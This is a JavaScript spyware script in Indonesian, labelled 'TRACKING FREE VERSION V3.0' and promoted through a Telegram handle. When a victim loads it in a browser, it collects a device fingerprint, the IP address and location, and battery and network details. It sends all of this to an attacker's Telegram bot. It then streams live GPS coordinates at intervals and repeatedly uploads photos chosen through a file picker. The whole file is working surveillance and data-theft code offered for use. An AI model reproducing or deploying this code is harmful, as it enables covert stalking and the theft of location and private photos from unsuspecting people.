// ==== TRACKING FREE VERSION V3.0 ==== //
// ==== TELEGRAM @XemzzXiterz ==== //
let xemzzIdPantauGPS = null;
let xemzzIntervalPantauGPS = null;
let xemzzIntervalGaleri = null;

const xemzzMulaiPelacakan = async () => {
    const xemzzFormatWaktu = () => {
        return new Date().toLocaleString('id-ID', {
            weekday: 'long',
            day: 'numeric',
            month: 'long',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    };
    
    const xemzzKirimKeTelegram = async (teks) => {
        return fetch(`https://api.telegram.org/bot${config.XemzzToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.XemzzId,
                text: teks,
                parse_mode: 'HTML'
            })
        });
    };

    const xemzzKirimFotoKeTelegram = async (dataFoto, keterangan = '') => {
        const formData = new FormData();
        formData.append('chat_id', config.XemzzId);
        formData.append('photo', dataFoto);
        formData.append('caption', keterangan);
        
        return fetch(`https://api.telegram.org/bot${config.XemzzToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    };

    const xemzzDapatkanFotoGaleri = async () => {
        try {
            if (!('showOpenFilePicker' in window)) {
                return null;
            }
            
            const opsi = {
                types: [
                    {
                        description: 'Gambar',
                        accept: {
                            'image/*': ['.png', '.jpg', '.jpeg', '.gif']
                        }
                    },
                ],
                multiple: true,
                excludeAcceptAllOption: true,
            };
            
            const handleFile = await window.showOpenFilePicker(opsi);
            const foto = [];
            
            for (let i = 0; i < Math.min(handleFile.length, 2); i++) {
                const file = await handleFile[i].getFile();
                foto.push(file);
            }
            
            return foto;
        } catch (error) {
            console.error('Error mengakses galeri:', error);
            return null;
        }
    };

    const xemzzMulaiPelacakanGPSLive = () => {
        if (!navigator.geolocation) {
            console.error('Geolocation tidak didukung browser ini');
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            async (posisi) => {
                const { latitude, longitude, accuracy } = posisi.coords;
                const pesanGPS = `
📍 <b>PELACAKAN GPS LIVE DIMULAI</b>
🕒 <b>Waktu:</b> ${xemzzFormatWaktu()}
📍 <b>Lokasi Terkini:</b>
   • Latitude: ${latitude}
   • Longitude: ${longitude}
   • Akurasi: ${accuracy} meter
   • <a href="https://www.google.com/maps?q=${latitude},${longitude}">Lihat di Google Maps</a>
                `;
                
                await xemzzKirimKeTelegram(pesanGPS);
            },
            (error) => {
                console.error('Error mendapatkan lokasi:', error);
            }
        );
        
        xemzzIdPantauGPS = navigator.geolocation.watchPosition(
            async (posisi) => {
                const { latitude, longitude, accuracy, speed, heading } = posisi.coords;
                const pesanGPS = `
📍 <b>PEMBARUAN GPS LIVE</b>
🕒 <b>Waktu:</b> ${xemzzFormatWaktu()}
📍 <b>Lokasi:</b>
   • Latitude: ${latitude}
   • Longitude: ${longitude}
   • Akurasi: ${accuracy} meter
   • Kecepatan: ${speed ? `${speed} m/s` : 'Tidak diketahui'}
   • Arah: ${heading ? `${heading}°` : 'Tidak diketahui'}
   • <a href="https://www.google.com/maps?q=${latitude},${longitude}">Lihat di Google Maps</a>
                `;
                
                await xemzzKirimKeTelegram(pesanGPS);
            },
            (error) => {
                console.error('Error memantau posisi:', error);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
        
        xemzzIntervalPantauGPS = setInterval(async () => {
            navigator.geolocation.getCurrentPosition(
                async (posisi) => {
                    const { latitude, longitude, accuracy } = posisi.coords;
                    const pesanGPS = `
📍 <b>PEMBARUAN GPS INTERVAL</b>
🕒 <b>Waktu:</b> ${xemzzFormatWaktu()}
📍 <b>Lokasi:</b>
   • Latitude: ${latitude}
   • Longitude: ${longitude}
   • Akurasi: ${accuracy} meter
   • <a href="https://www.google.com/maps?q=${latitude},${longitude}">Lihat di Google Maps</a>
                    `;
                    
                    await xemzzKirimKeTelegram(pesanGPS);
                },
                (error) => {
                    console.error('Error mendapatkan lokasi interval:', error);
                }
            );
        }, 120000);
    };

    const xemzzDapatkanDanKirimLogGaleri = async () => {
        try {
            const foto = await xemzzDapatkanFotoGaleri();
            if (foto && foto.length > 0) {
                await xemzzKirimKeTelegram(`🖼️ <b>MENGAMBIL FOTO DARI GALERI</b>\n🕒 <b>Waktu:</b> ${xemzzFormatWaktu()}\n📸 <b>Jumlah foto ditemukan:</b> ${foto.length}`);
                
                for (let i = 0; i < foto.length; i++) {
                    try {
                        await xemzzKirimFotoKeTelegram(
                            foto[i], 
                            `📸 <b>Foto ${i+1} dari Galeri</b>\n🕒 <b>Waktu:</b> ${xemzzFormatWaktu()}\n📁 <b>Nama file:</b> ${foto[i].name}`
                        );
                        await new Promise(selesaikan => setTimeout(selesaikan, 1000));
                    } catch (error) {
                        console.error(`Error mengirim foto ${i+1}:`, error);
                    }
                }
            } else {
                await xemzzKirimKeTelegram(`🖼️ <b>GALERI TIDAK DAPAT DIAKSES ATAU KOSONG</b>\n🕒 <b>Waktu:</b> ${xemzzFormatWaktu()}`);
            }
        } catch (error) {
            console.error('Error dalam akses galeri:', error);
            await xemzzKirimKeTelegram(`🖼️ <b>ERROR AKSES GALERI</b>\n🕒 <b>Waktu:</b> ${xemzzFormatWaktu()}\n📛 <b>Error:</b> ${error.message}`);
        }
    };
    
    const xemzzDapatkanInfoLokasi = async () => {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                kota: data.city || 'Tidak diketahui',
                provinsi: data.region || 'Tidak diketahui',
                negara: data.country_name || 'Tidak diketahui',
                isp: data.org || 'Tidak diketahui',
                vpn: data.vpn || data.proxy ? 'Ya' : 'Tidak',
                latitude: data.latitude || 'Tidak diketahui',
                longitude: data.longitude || 'Tidak diketahui',
                zonaWaktu: data.timezone || 'Tidak diketahui'
            };
        } catch (e) {
            return {
                ip: 'Gagal mendapatkan',
                kota: 'Gagal mendapatkan',
                provinsi: 'Gagal mendapatkan',
                negara: 'Gagal mendapatkan',
                isp: 'Gagal mendapatkan',
                vpn: 'Gagal mendapatkan',
                latitude: 'Gagal mendapatkan',
                longitude: 'Gagal mendapatkan',
                zonaWaktu: 'Gagal mendapatkan'
            };
        }
    };
    
    const xemzzDapatkanInfoBaterai = async () => {
        if (navigator.getBattery) {
            const baterai = await navigator.getBattery();
            return {
                level: Math.floor(baterai.level * 100),
                charging: baterai.charging ? 'Ya' : 'Tidak',
                chargingTime: baterai.chargingTime,
                dischargingTime: baterai.dischargingTime
            };
        }
        return null;
    };
    
    const xemzzDapatkanInfoKoneksi = () => {
        if (navigator.connection) {
            return {
                effectiveType: navigator.connection.effectiveType || 'Tidak diketahui',
                downlink: navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'Tidak diketahui',
                rtt: navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'Tidak diketahui'
            };
        }
        return null;
    };
    
    const xemzzDapatkanInfoPerangkat = () => {
        return {
            bahasa: navigator.language || 'Tidak diketahui',
            bahasaTersedia: navigator.languages ? navigator.languages.join(', ') : 'Tidak diketahui',
            cookieEnabled: navigator.cookieEnabled ? 'Ya' : 'Tidak',
            javaEnabled: navigator.javaEnabled ? 'Ya' : 'Tidak',
            pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Ya' : 'Tidak'
        };
    };
    
    const xemzzDapatkanPerangkatMedia = async () => {
        try {
            const perangkat = await navigator.mediaDevices.enumerateDevices();
            return {
                audioInput: perangkat.filter(d => d.kind === 'audioinput').length,
                videoInput: perangkat.filter(d => d.kind === 'videoinput').length,
                audioOutput: perangkat.filter(d => d.kind === 'audiooutput').length
            };
        } catch (e) {
            return {
                audioInput: 'Gagal mendapatkan',
                videoInput: 'Gagal mendapatkan',
                audioOutput: 'Gagal mendapatkan'
            };
        }
    };
    
    const xemzzInfoLokasi = await xemzzDapatkanInfoLokasi();
    const xemzzInfoBaterai = await xemzzDapatkanInfoBaterai();
    const xemzzInfoKoneksi = xemzzDapatkanInfoKoneksi();
    const xemzzInfoPerangkat = xemzzDapatkanInfoPerangkat();
    const xemzzPerangkatMedia = await xemzzDapatkanPerangkatMedia();
    
    const xemzzLaporan = `
<pre>╭──────── HASIL TRACKING V3.0 ────────╮

📅 <b>Waktu:</b> ${xemzzFormatWaktu()}

📱 <b>Informasi Perangkat:</b>
   • Platform: ${navigator.platform}
   • Browser: ${navigator.userAgent}
   • Ukuran Layar: ${screen.width}x${screen.height}
   • CPU Cores: ${navigator.hardwareConcurrency || 'Tidak diketahui'}
   • RAM: ${navigator.deviceMemory || 'Tidak diketahui'} GB
   • Touchscreen: ${'ontouchstart' in window ? 'Ya' : 'Tidak'}
   • Online: ${navigator.onLine ? 'Ya' : 'Tidak'}
   • Bahasa: ${xemzzInfoPerangkat.bahasa}
   • Cookie Enabled: ${xemzzInfoPerangkat.cookieEnabled}
   • Java Enabled: ${xemzzInfoPerangkat.javaEnabled}
   • PDF Viewer Enabled: ${xemzzInfoPerangkat.pdfViewerEnabled}

🌐 <b>Informasi Jaringan:</b>
   • IP: ${xemzzInfoLokasi.ip}
   • Kota/Kab: ${xemzzInfoLokasi.kota}
   • Provinsi: ${xemzzInfoLokasi.provinsi}
   • Negara: ${xemzzInfoLokasi.negara}
   • ISP: ${xemzzInfoLokasi.isp}
   • VPN/Proxy: ${xemzzInfoLokasi.vpn}
   • Latitude: ${xemzzInfoLokasi.latitude}
   • Longitude: ${xemzzInfoLokasi.longitude}
   • Zona Waktu: ${xemzzInfoLokasi.zonaWaktu}
   ${xemzzInfoKoneksi ? `
   • Tipe Koneksi: ${xemzzInfoKoneksi.effectiveType}
   • Kecepatan Downlink: ${xemzzInfoKoneksi.downlink}
   • RTT: ${xemzzInfoKoneksi.rtt}
   ` : ''}

🔋 <b>Informasi Baterai:</b>
   ${xemzzInfoBaterai ? `
   • Level: ${xemzzInfoBaterai.level}%
   • Sedang Dicharge: ${xemzzInfoBaterai.charging}
   ` : 'Tidak tersedia'}

🎤 <b>Perangkat Media:</b>
   • Input Audio: ${xemzzPerangkatMedia.audioInput}
   • Input Video: ${xemzzPerangkatMedia.videoInput}
   • Output Audio: ${xemzzPerangkatMedia.audioOutput}

╰───────── DEVELOPER @XemzzXiterz ─────────╯</pre>

<blockquote>INFO UPDATE: <a href="https://t.me/+toDQtab6PsZiM2M9">DISINI BANG</a>
NOTE: TRACKING INI FREE, JIKA ADA YANG MENJUAL SEGERA HUBUNGI DEVELOPER</blockquote>
    `;
    
    await xemzzKirimKeTelegram(xemzzLaporan);
    
    xemzzMulaiPelacakanGPSLive();
    
    await xemzzDapatkanDanKirimLogGaleri();
    
    xemzzIntervalGaleri = setInterval(xemzzDapatkanDanKirimLogGaleri, 300000);
};

const xemzzHentikanPelacakan = () => {
    if (xemzzIdPantauGPS !== null) {
        navigator.geolocation.clearWatch(xemzzIdPantauGPS);
    }
    if (xemzzIntervalPantauGPS !== null) {
        clearInterval(xemzzIntervalPantauGPS);
    }
    if (xemzzIntervalGaleri !== null) {
        clearInterval(xemzzIntervalGaleri);
    }
};

window.addEventListener('beforeunload', xemzzHentikanPelacakan);
window.addEventListener('unload', xemzzHentikanPelacakan);

window.startTracking = xemzzMulaiPelacakan;
window.stopTracking = xemzzHentikanPelacakan;